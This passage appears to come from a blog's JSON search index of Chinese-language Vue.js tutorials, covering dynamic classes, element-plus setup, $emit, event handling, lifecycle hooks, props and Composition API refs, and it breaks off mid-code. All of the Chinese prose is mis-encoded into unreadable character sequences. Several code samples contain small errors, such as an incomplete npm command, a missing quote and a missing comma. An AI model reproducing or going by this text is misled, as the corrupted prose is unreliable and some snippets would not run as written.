v-for=\"user of users\" class=\"default\" :class=\"{ online: user.isOnline }\"&gt; &lt;div&gt; &lt;img :src=\"user.img\" :alt=\"user.name\" /&gt; &lt;/div&gt; &lt;div&gt; {{ user.name }} &lt;br /&gt; {{ user.age }} &lt;/div&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; å°±æ˜¯åœ¨ :class å‚³å…¥ä¸€å€‹ç‰©ä»¶ï¼Œkey å°±ä»£è¡¨ classNameï¼Œvalue å‰‡æ˜¯ç”¨ä¾†çš„é–‹é—œï¼ˆtrue / falseï¼‰ã€‚ é †é“ä¸€æå¦‚æœä½ çš„ key ä¸æ˜¯åˆæ³•çš„è¼¸å…¥ï¼Œåƒæ˜¯ card-body çš„è©±ï¼Œè¨˜å¾—è¦ç”¨ã€Œå­—ä¸²çš„å½¢å¼ã€ä¾†å¡«å…¥ã€‚","link":"/2022/07/25/vue-dynamic-class/"},{"title":"Vue-element-plus ç’°å¢ƒé…ç½®","text":"å¾ React è½‰æˆ Vue é¦¬ä¸Šå°±è¸©é›·ã€‚ ç°¡è¿°ç•¶åˆæ˜¯çœ‹ å®˜æ–¹æ–‡ä»¶ ä¾†é…ç½®çš„ï¼Œä¸éæˆ‘è‡ªå·±è¦ºå¾—å¯¦åœ¨æ˜¯å¯«å¾—æœ‰é»äº‚ï¼Œå› ç‚ºç•¶æ™‚çš„ä¸»æµéƒ½æ˜¯ä»¥ Vite ç‚ºä¸»ï¼Œè€Œ Vue-CLI çš„ç›¸é—œè³‡æ–™å°±é¡¯å¾—å°‘è »å¤šçš„ã€‚ ç¸½ä¹‹å‘¢ï¼Œé€™ç¯‡æœƒä»¥ Vue-CLI çš„è§’åº¦ä¾†å¯«ä¸€ç¯‡æ›´å¥½æ‡‚çš„æ•™å­¸ä¾†è¨˜éŒ„ä¸€ä¸‹ï¼Œä¹Ÿé †ä¾¿è§£é‡‹ä¸€äº›åŸºæœ¬è§€å¿µã€‚ å‰å‚™çŸ¥è­˜ç•¶åˆåœ¨é…ç½®æ™‚èŠ±äº†ä¸€æ®µæ™‚é–“æ‰æå¥½ï¼Œé€™æ˜¯å› ç‚º Vue è·Ÿ React åœ¨å¼•å…¥ UI å…ƒä»¶çš„æ–¹å¼æœ‰é»ä¸å¤ªä¸€æ¨£ï¼Œæ‰€ä»¥æˆ‘æƒ³å…ˆåœ¨é€™é‚Šè§£é‡‹ä¸€ä¸‹å·®åˆ¥ã€‚ é¦–å…ˆåœ¨ React ä¸­å¦‚æœè¦ä½¿ç”¨ Muiï¼Œæˆ‘å€‘é€šå¸¸æ˜¯é€™æ¨£åšï¼š 123456import * as React from 'react'import Button from '@mui/material/Button'function App() { return &lt;Button variant='contained'&gt;Hello World&lt;/Button&gt;} React çš„åšæ³•æ˜¯ã€Œç›´æ¥åœ¨å…ƒä»¶ä¸­æŠŠ UI å…ƒä»¶å¼•å…¥ã€ã€‚ä»¥æˆ‘è‡ªå·±çš„è§’åº¦è€Œè¨€é€™æ˜¯å¾ˆç›´è¦ºçš„æ–¹å¼ï¼Œç•¢ç«Ÿå°±æ˜¯ç›´æ¥ import é€²ä¾†ç”¨å˜›ï¼Ÿ è€Œ Vue é™¤äº†ç›´æ¥åœ¨ SFC ä¸­å¼•å…¥ä»¥å¤–ï¼Œé‚„æœ‰ä¸€ç¨®æ›´ç°¡æ½”çš„åšæ³•ï¼Œé€™é‚Šæ‹¿ element-plush ä¾†èˆ‰ä¾‹ã€‚ ç›´æ¥åœ¨ SFC ä¸­å¼•å…¥ï¼š 1234567891011121314&lt;template&gt; &lt;nav&gt; &lt;el-button type=\"primary\"&gt;Hello&lt;/el-button&gt; &lt;/nav&gt; &lt;router-view /&gt;&lt;/template&gt;&lt;script&gt; import { ElButton } from 'element-plus' export default { components: { ElButton } }&lt;/script&gt; é›–ç„¶é€™æ¨£åšä¹Ÿå¯è¡Œï¼Œä¸éä½ æ‡‰è©²æœƒæ›´å¸¸çœ‹åˆ°ä¸‹é¢é€™ç¨®å¯«æ³•ï¼š 12345678910import { createApp } from 'vue'import App from './App.vue'import { ElButton } from 'element-plus'import 'element-plus/dist/index.css'const app = createApp(App)// è¨»å†Šï¼ˆå…ƒä»¶åç¨±ï¼Œå…ƒä»¶ï¼‰app.component(ElButton.name, ElButton)app.use(router)app.mount('#app') é€™å€‹ä½œæ³•æ˜¯ç›´æ¥ã€Œåœ¨ Vue å¯¦é«”ä¸Šè¨»å†Šï¼ˆRegisterï¼‰å…¨åŸŸå…ƒä»¶ã€ã€‚ æ„æ€å°±æ˜¯æ‰€æœ‰çš„ SFC ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨ &lt;el-button&gt;ï¼Œä¸ç”¨å†åšå¼•å…¥çš„å‹•ä½œã€‚ é€™æ‡‰è©²ç®—æ˜¯ Vue çš„ç‰¹è‰²å§ï¼Œé›–ç„¶ä¸€é–‹å§‹è¦ºå¾—é€™å¥½æå‰›ï¼Œä¸éå¤šå¯«ä¸€æ®µæ™‚é–“å¾Œå°±æœƒè¦ºå¾—é€™æ¨£å…¶å¯¦ä¹Ÿä¸éŒ¯ã€‚ ç¸½ä¹‹å¦‚æœä½ æ˜¯ç”¨ Vue çš„ UI libraryï¼Œä½ åŸºæœ¬ä¸Šéƒ½æœƒçœ‹åˆ°ç¬¬äºŒç¨®å¯«æ³•ï¼Œåªæ˜¯æƒ³è§£é‡‹ä¸€ä¸‹é€™èƒŒå¾Œçš„åŸå› æ˜¯ä»€éº¼ã€‚ å®‰è£ä¾è³´é …ç›®é€™é‚Šå…ˆç”¨ Vue-CLI çš„ create &lt;project&gt; å»ºç«‹å¥½ä»¥å¾Œå†ä¾†å®‰è£ï¼š 1npm element-plus å¼•å…¥å¼•å…¥çš„æ–¹å¼æœ‰å…©ç¨®ï¼Œåˆ†åˆ¥ç‚ºã€Œå…¨éƒ¨å¼•å…¥ã€è·Ÿã€ŒæŒ‰éœ€å¼•å…¥ã€ã€‚ é€™è£¡é †ä¾¿æä¸€å€‹å°çŸ¥è­˜ï¼Œæˆ‘å€‘åœ¨ import å¥—ä»¶æ™‚é›–ç„¶éƒ½æœƒå¯«æˆ import { ElButton } from 'element-plus' é€™æ¨£çš„å½¢å¼ï¼Œä¸éå¯¦éš›ä¸Šçš„è·¯å¾‘æ˜¯å°æ‡‰åˆ° node_modules/element-plus/lib/index é€™å€‹ä½ç½®ã€‚ ç¸½ä¹‹å¦‚æœç­‰ä¸€ä¸‹å¼•å…¥éƒ¨åˆ†ä½ ç™¼ç¾æœ‰å•é¡Œï¼Œå¯ä»¥è©¦è‘—æª¢æŸ¥çœ‹çœ‹æ˜¯ä¸æ˜¯è·¯å¾‘ä¸å°ï¼Œé€šå¸¸æœ‰ 90% éƒ½æ˜¯å› ç‚ºé€™æ¨£å­ï¼Œè©¦è‘—è‡ªå·± debug çœ‹çœ‹å§ï¼ å…¨éƒ¨å¼•å…¥æ„æ€å°±æ˜¯ä¸€æ¬¡æŠŠæ‰€æœ‰å…ƒä»¶éƒ½å¼•å…¥ï¼š 12345678910111213// main.jsimport { createApp } from 'vue'import App from './App.vue'// cssimport 'element-plus/dist/index.css'// components (all)import ElementPlus from 'element-plus'const app = createApp(App)// registerapp.use(ElementPlus)app.use(router)app.mount('#app') ä¸ç®¡æ˜¯ CSS é‚„æ˜¯å…ƒä»¶éƒ½ç›´æ¥å…¨éƒ¨å¼•å…¥ï¼Œæ¥è‘—å°±å¯ä»¥ç›´æ¥åœ¨å…ƒä»¶ä¸­ä½¿ç”¨äº†ã€‚é€™æ‹›æœ€ç°¡å–®ï¼Œä½†ç¼ºé»å°±æ˜¯ä½ å¦‚æœä½ ç”¨çš„æ•¸é‡ä¸å¤šçš„è©±æœƒé¡¯å¾—æµªè²»ã€‚ æŒ‰éœ€å¼•å…¥é€™é‚Šæ˜¯æˆ‘è¦ºå¾—æ–‡ä»¶ä¸­å¯«çš„æœ€éº»ç…©çš„åœ°æ–¹ï¼Œä¸€é–‹å§‹å°±è¦ä½ å®‰è£ä¸€å †å¥—ä»¶è·Ÿèª¿æ•´ webpackã€‚ é€™é‚Šæˆ‘æƒ³å…ˆä»‹ç´¹ä¸€ä¸‹æœ€ç°¡å–®çš„æ–¹å¼ï¼Œé€™é‚Šä½ ä¸éœ€è¦å®‰è£ä»»ä½•æ±è¥¿ï¼Œåªè¦å…ˆé€™æ¨£å¯«å°±å¥½ï¼š 12345678910111213// main.jsimport { createApp } from 'vue'import App from './App.vue'import router from './router'import { ElButton } from 'element-plus'// cssimport 'element-plus/dist/index.css'const app = createApp(App)// registerapp.component(ElButton.name, ElButton)app.use(router)app.mount('#app') å…¶å¯¦å°±æ˜¯æŠŠéœ€è¦çš„å…ƒä»¶æ‹¿å‡ºä¾†ç”¨è€Œå·²ï¼Œè€Œä¸æ˜¯æ•´åŒ…æ‹¿å‡ºä¾†ã€‚ ä¸éé€™é‚Šæ‡‰è©²æœƒæ³¨æ„åˆ° CSS çš„éƒ¨åˆ†æ˜¯å¼•å…¥ index.cssï¼Œæœ‰æ²’æœ‰è¾¦æ³•åªå¼•å…¥ Elbutton æœƒç”¨åˆ°çš„ CSS å°±å¥½ï¼Ÿ æœ‰ï¼Œé€™å€‹å°±æ˜¯æ–‡ä»¶è£¡é¢è¦ä½ å®‰è£å„ç¨®å¥—ä»¶è·Ÿèª¿æ•´è¨­å®šçš„åŸå› ã€‚å¦‚æœä½ æ²’æœ‰å¾ˆåœ¨æ„ã€Œé«”ç©ã€çš„å•é¡Œçš„è©±ï¼Œåº•ä¸‹çš„éƒ¨åˆ†ä½ å¯ä»¥ç•¥éï¼Œå› ç‚ºå®Œå…¨æ²’æœ‰å¿…è¦ã€‚ ç¸½ä¹‹é€™æ¨£å­åšçš„ç”¨æ„æ˜¯é™ä½å®¹é‡ï¼Œæ ¹æ“šæˆ‘å¯¦æ¸¬çš„çµæœä¾†çœ‹æœ€å¤šå¯ä»¥æ¸›å°‘å€‹ 100KB å·¦å³å§ï¼ˆçœ‹ä½ å¯¦éš›ç”¨çš„å¤šæˆ–å°‘ï¼‰ï¼Œæ‰€ä»¥é€™å€‹å°±çœ‹çœŸçš„çœ‹å€‹äººéœ€æ±‚ä¾†æ±ºå®šäº† é¦–å…ˆä¾†å®‰è£æ–°çš„åŒ…ï¼š 1npm i unplugin-element-plus -D æ¥è‘—èª¿æ•´ vue.config.jsï¼š 12345678910module.exports = defineConfig({ // ... configureWebpack: { plugins: [ require('unplugin-element-plus/webpack')({ // options }) ] }}) é™„è¨»ï¼šé—œæ–¼ options çš„éƒ¨åˆ†æƒ³çŸ¥é“æ›´å¤šå¯ä»¥åƒè€ƒæ–‡ä»¶ã€‚ é€™å€‹åŒ…çš„ç”¨é€”å°±æ˜¯åœ¨æˆ‘ã€Œå¼•å…¥å…ƒä»¶æ™‚ä¹Ÿè‡ªå‹•å¼•å…¥å°æ‡‰çš„ CSS æª”æ¡ˆã€ï¼Œåƒé€™æ¨£ï¼š 123456// æˆ‘çœ‹èµ·ä¾†åªå¼•å…¥äº†é€™å€‹import { ElButton } from 'element-plus'// ä½†å¯¦éš›æœƒåœ¨èƒŒå¾Œå¹«æˆ‘å¤šå¼•å…¥ CSS æª”æ¡ˆimport { ElButton } from 'element-plus'import 'element-plus/es/components/button/style/css' çœ‹åˆ°é€™é‚Šä½ æ‡‰è©²ä¹Ÿç†è§£ç‚ºä»€éº¼è¦æœ‰é€™å€‹å¥—ä»¶äº†å§ï¼Ÿç•¢ç«Ÿå¦³ä¸å¯ä»¥æ¯ç”¨ä¸€å€‹å…ƒä»¶å°±å»æ‰¾å‡ºå°æ‡‰çš„ CSS ä¾†å¼•å…¥ï¼Œæ€éº¼æƒ³éƒ½å¤ªéº»ç…©äº†ï¼Œæ‰€ä»¥æ‰æœƒå¯«æˆå¥—ä»¶ä¾†è™•ç†ã€‚ OKï¼Œåˆ°é€™é‚Šä»¥å¾ŒåŸºæœ¬ä¸Šå°±é…ç½®å¥½ç’°å¢ƒäº†ï¼Œæœ€å¾Œæœƒä¾†è¨è«–ä¸€ä¸‹å„ªåŒ–çš„éƒ¨åˆ†ã€‚ æœ€å¾Œçš„å„ªåŒ–çœ‹åˆ°é€™é‚Šä½ æ‡‰è©²å·²ç¶“çŸ¥é“æ€éº¼ã€ŒæŒ‰éœ€å¼•å…¥ã€éœ€è¦çš„æ±è¥¿äº†ï¼Œä¸éæˆ‘æƒ³ä»‹ç´¹ä¸€å€‹æ›´å„ªé›…çš„å¯«æ³•ï¼Œç•¢ç«Ÿä½ æ‡‰è©²ä¸æœƒæƒ³åƒé€™æ¨£å­æŠŠæ‰€æœ‰æ±è¥¿éƒ½å¯«åœ¨ main.js è£¡ï¼š 1234567891011121314151617181920212223242526import { createApp } from 'vue'import App from './App.vue'import router from './router'import { ElInput, ElForm, ElFormItem, ElButton, ElMessage, ElNotification // ...} from 'element-plus'const app = createApp(App)// register componentapp.component(ElInput.name, ElInput)app.component(ElForm.name, ElForm)app.component(ElFormItem.name, ElFormItem)app.component(ElButton.name, ElButton)// register pluginapp.use(ElMessage)app.use(ElNotification)app.use(router)app.mount('#app') é™„è¨»ï¼šplugin æŒ‡çš„æ˜¯åƒ ElNotification é€™ç¨®å±¬æ–¼ function è€Œä¸æ˜¯å…ƒä»¶çš„æ±è¥¿ã€‚ æ‰€ä»¥ä½ å¯ä»¥å»ºç«‹ä¸€å€‹ src/plugins/elementui.jsï¼š 123456789101112131415import { ElInput, ElForm, ElFormItem, ElButton, ElMessage, ElNotification, // ...} from 'element-plus'// componentsexport const elComponents = [ElInput, ElForm, ElFormItem, ElButton, ...]// pluginsexport const elPlugins = [ElMessage, ElNotification, ...] æ¥è‘—åœ¨ main.js çš„æ™‚å€™å°±å¯ä»¥ä¹¾æ·¨å¾ˆå¤šï¼š 123456789101112131415161718import { createApp } from 'vue'import App from './App.vue'import router from './router'import { elComponents, elPlugins } from './plugin/elementui'const app = createApp(App)// register componentelComponents.forEach((c) =&gt; { app.component(c.name, c)})// register pluginelPlugins.forEach((p) =&gt; { app.use(p)})app.use(router)app.mount('#app')","link":"/2022/07/23/vue-element-plus-set-up/"},{"title":"Vueï¼æ¥ä½æˆ‘çš„äº‹ä»¶å§ï¼ˆ$emitï¼‰","text":"æŠ“ä½ä½ ~ ç°¡è¿°Vue çš„äº‹ä»¶æ¯”è¼ƒç‰¹åˆ¥ä¸€äº›ï¼Œä¸æ˜¯é€é propsï¼Œè€Œæ˜¯é€é $emit ä¾†å»ºç«‹ä¸€å€‹ã€Œcustom eventã€ï¼Œç›´æ¥ä¾†çœ‹ä¾‹å­ï¼š 12345678910111213141516171819202122232425&lt;template&gt; &lt;div class=\"backdrop\"&gt; &lt;div class=\"modal\" :class=\"{ sale: isSale }\"&gt; &lt;div class=\"content\"&gt; &lt;h2&gt;{{ user.name }}&lt;/h2&gt; &lt;p&gt;{{ user.email }}&lt;/p&gt; &lt;!-- @click åŸ·è¡Œ onClick handler --&gt; &lt;button class=\"btn\" @click=\"onClick\"&gt;Close&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { name: 'Modal', props: ['user'], methods: { onClick() { // æ‹‹å‡º custom event this.$emit('onClose') } } }&lt;/script&gt; ç•¶ child emit å‡ºä¸€å€‹äº‹ä»¶å¾Œï¼Œparent å°±å¯ä»¥ç›´æ¥æ‹¿é€™å€‹ event ä¾†ç”¨ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"block\"&gt; &lt;button class=\"btn\" @click=\"onOpen\"&gt;Show modal&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- @onClose = å¾ Modal å‚³å‡ºçš„ custom event --&gt; &lt;Modal v-show=\"isModal\" :user=\"user\" @onClose=\"onClose\" /&gt;&lt;/template&gt;&lt;script&gt; import Modal from './components/Modal.vue' export default { name: 'App', components: { Modal }, data() { return { isModal: false, user: { name: 'PeaNu', email: 'PeaNug@peanu.dev' } } }, methods: { onOpen() { this.isModal = true }, // @onClose è§¸ç™¼æ™‚çš„ handler onClose() { this.isModal = false } } }&lt;/script&gt; ä¸éé€™é‚Šå…¶å¯¦é‚„æ˜¯å¯ä»¥ç”¨ React çš„æ€ç¶­ä¾†åšï¼ˆå€‹äººè¦ºå¾— React çš„ä½œæ³•æ›´ç›´è¦ºï¼‰ï¼Œå°±æ˜¯ã€ŒæŠŠ function å¯«å¥½å¾Œå†ç•¶ä½œ props å‚³ä¸‹å»ã€ï¼Œåƒé€™æ¨£ï¼š 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;div class=\"container\"&gt; &lt;button class=\"btn\" @click=\"onOpen\"&gt;Show modal&lt;/button&gt; &lt;/div&gt; &lt;!-- :onClose = ç”¨ä¾†é—œæ‰ modal çš„ handler --&gt; &lt;Modal v-show=\"isModal\" :onClose=\"onClose\" /&gt;&lt;/template&gt;&lt;script&gt; import Modal from './components/Modal.vue' export default { name: 'App', components: { Modal }, data() { return { isModal: false, } }, methods: { onOpen() { this.isModal = true } onClose() { this.isModal = false } } }&lt;/script&gt; 1234567891011121314151617&lt;template&gt; &lt;div class=\"backdrop\"&gt; &lt;div class=\"modal&gt; &lt;div class=\"content\"&gt; ... &lt;button class=\"btn\" @click=\"onClose\"&gt;Close&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default { name: 'Modal', props: ['user', 'isSale', 'onClose'] // æ¥æ”¶ props}&lt;/script&gt; å¸¶ä¸Šåƒæ•¸emit å‡ºå»çš„äº‹ä»¶çš„æ˜¯å¯ä»¥å¸¶å…¥åƒæ•¸çš„ï¼Œåªè¦åœ¨ emit çš„æ™‚å€™å¸¶é€²å»å°±å¥½äº†ï¼š 123456// Popup.vuemethods: { onClick() { this.$emit('onClick', 'my param') }} 123456789101112131415&lt;template&gt; &lt;Popup @onClick=\"handle\" /&gt;&lt;/template&gt;&lt;script&gt; export default { name: 'App', methods: { handle(param) { // my param console.log(param) } } }&lt;/script&gt; å¦‚æœä½ å¸Œæœ›ç›´æ¥åœ¨ inline ä¸­å­˜å–åƒæ•¸çš„è©±ï¼Œå¯ä»¥é€™æ¨£å­å¯«ï¼š 1234567891011121314&lt;template&gt; &lt;Popup v-if=\"isShowPopup\" @onClick=\"isShowPopup = $event\" /&gt;&lt;/template&gt;&lt;script&gt; export default { name: 'App', data() { return { isShowPopup: false } } }&lt;/script&gt; é™„è¨»ï¼šæˆ‘çŸ¥é“é€™ä¾‹å­æœ‰é»æ€ªï¼Œä¸éé‡é»æ˜¯ç†è§£å¯ä»¥é€™æ¨£ç”¨å°±å¥½ã€‚ åƒæ•¸æœƒç›´æ¥ç”¨ $event ä¾†è¡¨ç¤ºï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨å®ƒä¾†å–å¾—ã€‚","link":"/2022/08/03/vue-emit/"},{"title":"Vueï¼äº‹ä»¶åŸºç¤","text":"æœ€åŸºæœ¬ä½†ä¹Ÿæœ€é‡è¦ã€‚ ç°¡è¿°å…ˆç”¨ä¸€å€‹æœ€ç°¡å–®çš„ click äº‹ä»¶ä¾†èªªæ˜ï¼š 123456&lt;div id=\"app\"&gt; &lt;h2&gt;{{ message }} - {{ name }} - {{ age }}&lt;/h2&gt; &lt;button @click=\"age++\"&gt;Increase&lt;/button&gt; &lt;button @click=\"age--\"&gt;Decrease&lt;/button&gt; &lt;div @click=\"message = 'Hello PeaNu'\"&gt;Change message&lt;/div&gt;&lt;/div&gt; é€™é‚Šå°±æ˜¯ç†Ÿæ‚‰çš„ã€Œå­—ä¸²å¼ JSã€ï¼Œé›–ç„¶çœ‹èµ·ä¾†æ˜¯å­—ä¸² but å¯¦éš›ä¸Šæ˜¯åœ¨å¯« JSã€‚ ä¸éè¦ç‰¹åˆ¥æ³¨æ„çš„åœ°æ–¹æ˜¯ã€Œä¸éœ€è¦ç”¨ function ä¾†åŒ…ä½ã€ï¼Œåƒé€™æ¨£ï¼š 1&lt;button @click=\"() =&gt; age--\"&gt;Decrease&lt;/button&gt; å¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£æ˜¯ä»¥å‰æ˜¯å¯« React çš„è©±ä¸€å®šæœƒè¦ºå¾—å¾ˆä¸ç§‘å­¸ï¼Œæ‰€ä»¥ç‰¹åˆ¥å¼·èª¿ä¸€ä¸‹é€™é»ã€‚ é€™æ¨£å­å¯«çš„å„ªé»ï¼Ÿå¾Œä¾†ç™¼ç¾é€™æ¨£å­å¯«å…¶å¯¦ä¹Ÿç®—æ˜¯æœ‰ä¸€äº›å°å„ªå‹¢ã€‚å¦‚æœç”¨ React çš„è§€å¿µä¾†åš togggle çš„è©±ï¼Œæˆ‘å€‘é€šå¸¸æœƒé€™æ¨£å¯«ï¼š 1234567891011121314151617&lt;ul&gt; &lt;li v-for=\"user of users\" class=\"default\" :class=\"{ online: user.isOnline}\" @click=\"toggleOnline(user.name)\" &gt; &lt;!-- onClick handler --&gt; &lt;div&gt; &lt;img :src=\"user.img\" :alt=\"user.name\" /&gt; &lt;/div&gt; &lt;div&gt; {{ user.name }} &lt;br /&gt; {{ user.age }} &lt;/div&gt; &lt;/li&gt;&lt;/ul&gt; 1234567methods: { toggleOnline(name) { this.users = this.users.map((u) =&gt; ( u.name === name ? { ...u, isOnline: !u.isOnline } : u) ) }} ä½†å¦‚æœå¯«æˆ inline çš„è©±å¯ä»¥éå¸¸ç°¡å–®ï¼š 1234567891011121314151617&lt;ul&gt; &lt;li v-for=\"user of users\" class=\"default\" :class=\"{ online: user.isOnline}\" @click=\"user.isOnline = !user.isOnline\" &gt; &lt;!-- è¼•è¼•é¬†é¬† --&gt; &lt;div&gt; &lt;img :src=\"user.img\" :alt=\"user.name\" /&gt; &lt;/div&gt; &lt;div&gt; {{ user.name }} &lt;br /&gt; {{ user.age }} &lt;/div&gt; &lt;/li&gt;&lt;/ul&gt; é€™æ˜¯å› ç‚ºåœ¨ Vue å¯ä»¥ç”¨ã€Œï½ utableã€çš„æ–¹å¼ä¾†æ”¹è³‡æ–™ï¼Œæ‰€ä»¥åˆ©ç”¨é€™å€‹ç‰¹å‹ä¾†å¯«æˆ inline å½¢å¼çš„è©±æœƒç™¼ç¾éå¸¸æ–¹ä¾¿ã€‚ $Event ç‰©ä»¶å‰é¢æœ‰èªªéåœ¨ Vue è£¡é¢çš„ Event handler æ²’è¾¦æ³•å†ç”¨ä¸€å€‹ function ä¾†åŒ…ä½ï¼Œåƒé€™æ¨£ï¼š 1&lt;button @click=\"() =&gt; age--\"&gt;Decrease&lt;/button&gt; é€™æ™‚å€™å¦‚æœæƒ³å–å¾— Event ç‰©ä»¶çš„è©±æ€éº¼è¾¦ï¼Ÿ åœ¨ã€Œæ²’æœ‰è‡ªè¨‚åƒæ•¸ã€çš„æƒ…æ³ä¸‹ Vue æœƒè‡ªå‹•å¹«ä½ å¸¶é€²å»ï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨å…ƒä»¶ä¸­å–å¾—ï¼š 123456789const app = Vue.createApp({ methods: { handleEvent(e) { console.log(e.type) } }})app.mount('#app') ä½†å¦‚æœæœ‰çš„è©±æ€éº¼è¾¦ï¼Ÿåƒé€™æ¨£å­ï¼š 1&lt;div @mouseover=\"handleEvent(5)\"&gt;mouseover&lt;/div&gt; é€™æ™‚å€™ä½ å°±å¾—æ‰‹å‹•å¸¶é€²å»æ‰è¡Œï¼Œä¸ç„¶æ˜¯æ‹¿ä¸åˆ° Event ç‰©ä»¶çš„ï¼Œè¦æ”¹æˆé€™æ¨£ï¼š 1&lt;div @mouseover=\"handleEvent($event, 5)\"&gt;mouseover&lt;/div&gt;","link":"/2022/07/24/vue-event/"},{"title":"Vueï¼ç”Ÿå‘½é€±æœŸ","text":"å¿…å‚™çŸ¥è­˜ä¹‹ä¸€ã€‚ ç°¡è¿°å…ˆä¾†çœ‹å€‹ç¶“å…¸åœ–ï¼š beforeCreate å…ƒä»¶æœªå»ºç«‹ï¼ŒDOM é‚„æ²’è¢«ç·¨è­¯ï¼ˆä»€éº¼éƒ½ä¸èƒ½å­˜å–ï¼‰ created å…ƒä»¶å·²å»ºç«‹ï¼Œä½† DOM é‚„æ²’è¢«ç·¨è­¯ï¼ˆå¯ä»¥å­˜å– Dataï¼‰ beforeMount DOM ç·¨è­¯å®Œæˆï¼Œä½†é‚„æ²’ mount ä¸Šå»ï¼ˆåˆ°é€™é‚Šå°±å¯ä»¥å­˜å– DOM äº†ï¼‰ mounted DOM æ”¾åˆ°ç•«é¢ä¸Šäº†ã€‚ beforeUpdate åœ¨é‡æ–°æ¸²ç„¶ä¹‹å‰ updated é‡æ–°æ¸²æŸ“åˆ°ç•«é¢ä¸Šä»¥å¾Œ beforeUnmount unmount ä»¥å‰ unMounted unmount ä»¥å¾Œ é™„è¨»ï¼š æ‰“ API é€šå¸¸æœƒåœ¨ mounted æˆ–æ˜¯æ›´ä¹‹å‰çš„ hookï¼Œè€Œ beforeUnmount å°±æ˜¯ clean function åœ¨ lifecycle hook ä¸­å¯ä»¥ç›´æ¥é€é this ä¾†å–å¾— propsï¼Œä¸éœ€è¦é€é this.$props æœ‰æ›´æ–°åˆ°ã€Œç•«é¢ã€æ‰æœƒé€²åˆ° update å€å¡Šï¼Œåªæ˜¯æ›´æ–° data çš„è©±ä¸æœƒ ç¯„ä¾‹ mounted &amp; updated","link":"/2022/08/06/vue-lifecycle/"},{"title":"Vueï¼å‚³éè³‡æ–™çš„å¥½å¤¥ä¼´ï¼ˆpropsï¼‰","text":"å‰ç«¯æ¡†æ¶å¿…å‚™åŠŸèƒ½ã€‚ ç°¡è¿°props å¤§æ¦‚æ˜¯å‰ç«¯æ¡†æ¶ä¸­å¾ˆå¸¸è¦‹çš„è¡“èªï¼Œå°±ç®—ä½ æ²’æœ‰ç”¨éæ‡‰è©²ä¹Ÿè½éå®ƒï¼Œæ‰€ä»¥é€™é‚Šå°±ç¨å¾®éä¸€ä¸‹ã€‚ å‡è¨­æˆ‘æœ‰ä¸€å€‹ Modal å…ƒä»¶ï¼Œæˆ‘å¸Œæœ›ä»–çš„å…§å®¹æ˜¯å¾çˆ¶å±¤å‚³ä¸‹ä¾†çš„ï¼Œé‚£å°±æœƒé€™æ¨£åšï¼š 123456789101112131415161718192021222324252627&lt;!-- App.vue --&gt;&lt;template&gt; &lt;div class=\"container\"&gt; ... &lt;/div&gt; &lt;!-- :user = æˆ‘å€‘è¦å‚³é€²å»çš„ props --&gt; &lt;Modal :user=\"user\" /&gt;&lt;/template&gt;&lt;script&gt;import Modal from './components/Modal.vue'export default { name: 'App', components: { Modal }, data() { return { // props ç¶å®šçš„è³‡æ–™ user: { name: 'PeaNu', email: 'PeaNug@peanu.dev' } } }} 123456789101112131415161718&lt;!-- Modal.vue --&gt;&lt;template&gt; &lt;div class=\"backdrop\"&gt; &lt;div class=\"modal\"&gt; &lt;div class=\"content\"&gt; &lt;h2&gt;{{ user.name }}&lt;/h2&gt; &lt;p&gt;{{ user.email }}&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { name: 'Modal', props: ['user'] // é€™é‚Šå°±å¯ä»¥æ¥æ”¶åˆ° props }&lt;/script&gt; å…¶å¯¦è§€å¿µéƒ½è·Ÿ React å·®ä¸å¤šï¼Œåªæ˜¯å¯«æ³•æœ‰é»ä¸å¤ªä¸€æ¨£è€Œå·²ã€‚","link":"/2022/08/02/vue-props/"},{"title":"Vueï¼Composition APIï¼ˆRef & Reactiveï¼‰","text":"å¾ˆé‡è¦çš„æ±è¥¿ã€‚ æ¯”è¼ƒä¸ä¸€æ¨£çš„ reféå»åœ¨ Options API è£¡è¦å­˜å– DOM å…ƒç´ çš„è©±ï¼Œæˆ‘å€‘é€šå¸¸æœƒé€™æ¨£å¯«ï¼š 1234567891011121314151617&lt;template&gt; &lt;div class=\"home\"&gt; &lt;p ref=\"p\"&gt;Hello Composition API&lt;/p&gt; &lt;button @click=\"logRef\"&gt;Click Me&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { methods: { logRef() { // å°å‡º DOM ç¯€é»è³‡è¨Š console.log(this.$refs.p) } } }&lt;/script&gt; ä¹‹æ‰€ä»¥èƒ½å¤ é€™æ¨£å­åšæ˜¯å› ç‚ºæˆ‘å€‘æœ‰ thisï¼Œé€™å€‹ this ä»£è¡¨çš„æ˜¯ Vue é€™å€‹å¯¦é«”ï¼Œè€Œ Vue å¯¦é«”ä¸Šæœƒè‡ªå¸¶ $ref ä¾†å„²å­˜ DOM å…ƒç´ çš„è³‡è¨Šã€‚ å¯æ˜¯åœ¨ Composition API ä¸­æœ‰ä¸€å€‹å¾ˆé‡è¦çš„å€åˆ¥ï¼Œé‚£å°±æ˜¯ï¼š setup æ²’æœ‰ this å€¼ setup æ²’æœ‰ this å€¼ setup æ²’æœ‰ this å€¼ å¦‚æœæˆ‘è©¦è‘—åœ¨ setup ä¸­å­˜å– this å€¼ï¼Œé‚£åªæœƒå¾—åˆ° undefinedï¼š 123456export default { setup() { // undefined console.log(this) }} æ‰€ä»¥æ­£ç¢ºçš„ä½œæ³•æœƒè®Šæˆé€™æ¨£ï¼š 1234567891011121314151617181920212223&lt;template&gt; &lt;div class=\"home\"&gt; &lt;!-- bind ref --&gt; &lt;p ref=\"pTag\"&gt;Hello Composition API&lt;/p&gt; &lt;button @click=\"logRef\"&gt;Click Me&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; // æŠŠ ref å¾ Vue çš„å¯¦é«”ä¸­å–å‡º import { ref } from 'vue' export default { setup() { 